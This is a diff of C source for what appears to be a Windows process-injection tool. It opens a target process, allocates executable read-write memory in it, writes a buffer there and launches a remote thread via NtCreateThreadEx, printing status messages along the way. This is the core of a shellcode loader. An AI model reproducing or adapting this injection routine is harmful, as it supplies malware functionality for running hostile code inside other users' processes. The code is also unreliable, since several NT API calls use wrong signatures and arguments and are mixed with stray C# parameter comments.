@@ -63,19 +63,21 @@ int main(int argc, char* argv[]) {
 
 
     HANDLE h = NtOpenProcess(WRITE_OWNER, true, PID);
+
     i(" getting proc handle...");
-    NtAllocateVirtualMemory(h, &Buf, s,0x00001000,0x40 );
-    /*[in]           HANDLE hProcess,
-      [in, optional] LPVOID lpAddress,
-      [in]           SIZE_T dwSize,
-      [in]           DWORD  flAllocationType,
-      [in]           DWORD  flProtect
-    */
+    int p = NtAllocateVirtualMemory(h, &Buf, s,0x00001000,0x40 );
+
+    // h, IntPtr.Zero, 0,Buf.Length, 0x00001000, 0x40
+
 
     printf("%s allocating virutal memory...", i);
     NtWriteVirtualMemory(h, &Buf, Buf, s, NULL);
+    //h, memAlloc , 0, Buf, (uint)(Buf.Length), out outout
     printf("%s writing virutal memory...", i);
-    if(NtCreateThreadEx(NULL, s, &Buf, NULL, h,NULL)) {
+    if(NtCreateThreadEx(NULL, s, &Buf, NULL, h,NULL) != 0)
+//0x1FFFFF, IntPtr.Zero, h, memAlloc, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero
+
+        {
         k(" thread created!");
     }
     else {
